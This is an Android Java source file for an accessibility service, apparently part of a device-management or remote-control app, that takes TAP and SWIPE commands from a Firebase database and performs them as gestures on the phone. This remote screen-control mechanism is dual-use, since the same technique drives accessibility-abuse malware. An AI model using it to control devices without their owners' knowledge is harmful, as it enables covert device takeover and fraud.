package com.my.Refiner.Cash.User;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Intent;
import android.graphics.Path;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import androidx.annotation.RequiresApi;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

public class TouchAccessibilityService extends AccessibilityService {

    private static final String TAG = "TouchAccessibility";
    private static TouchAccessibilityService instance;
    private DatabaseReference dbRef;
    private String deviceId;
    private ValueEventListener touchListener;

    public static TouchAccessibilityService getInstance() {
        return instance;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        dbRef = FirebaseDatabase.getInstance().getReference();
        deviceId = getSharedPreferences("mdm", MODE_PRIVATE)
                .getString("device_id", "unknown");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Accessibility connected");
        listenForTouchCommands();
    }

    private void listenForTouchCommands() {
        if (touchListener != null) return;

        touchListener = new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                if (!snapshot.exists()) return;

                String type = snapshot.child("type").getValue(String.class);
                Long time = snapshot.child("time").getValue(Long.class);

                if (type == null || time == null) return;

                // নতুন কমান্ড কিনা চেক (২ সেকেন্ডের মধ্যে)
                long now = System.currentTimeMillis();
                if (now - time > 5000) return;

                if ("TAP".equals(type)) {
                    Double x = snapshot.child("x").getValue(Double.class);
                    Double y = snapshot.child("y").getValue(Double.class);
                    if (x != null && y != null) {
                        performTap(x.floatValue(), y.floatValue());
                    }
                } else if ("SWIPE".equals(type)) {
                    Double x1 = snapshot.child("x1").getValue(Double.class);
                    Double y1 = snapshot.child("y1").getValue(Double.class);
                    Double x2 = snapshot.child("x2").getValue(Double.class);
                    Double y2 = snapshot.child("y2").getValue(Double.class);
                    if (x1 != null && y1 != null && x2 != null && y2 != null) {
                        performSwipe(x1.floatValue(), y1.floatValue(),
                                x2.floatValue(), y2.floatValue());
                    }
                }

                // কমান্ড ব্যবহারের পর ডিলিট
                dbRef.child("devices").child(deviceId).child("touchCommand").removeValue();
            }

            @Override
            public void onCancelled(DatabaseError error) {
                Log.e(TAG, "Firebase error: " + error.getMessage());
            }
        };

        dbRef.child("devices").child(deviceId).child("touchCommand")
                .addValueEventListener(touchListener);
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    private void performTap(float x, float y) {
        try {
            Path path = new Path();
            path.moveTo(x, y);

            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));

            dispatchGesture(builder.build(), null, null);
            Log.d(TAG, "Tap at: " + x + ", " + y);
        } catch (Exception e) {
            Log.e(TAG, "Tap error: " + e.getMessage());
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    private void performSwipe(float x1, float y1, float x2, float y2) {
        try {
            Path path = new Path();
            path.moveTo(x1, y1);
            path.lineTo(x2, y2);

            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 300));

            dispatchGesture(builder.build(), null, null);
            Log.d(TAG, "Swipe from " + x1 + "," + y1 + " to " + x2 + "," + y2);
        } catch (Exception e) {
            Log.e(TAG, "Swipe error: " + e.getMessage());
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // এই সার্ভিসের অন্য কাজ AppBlockService করছে
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Accessibility interrupted");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
        if (touchListener != null) {
            dbRef.child("devices").child(deviceId).child("touchCommand")
                    .removeEventListener(touchListener);
        }
    }
}
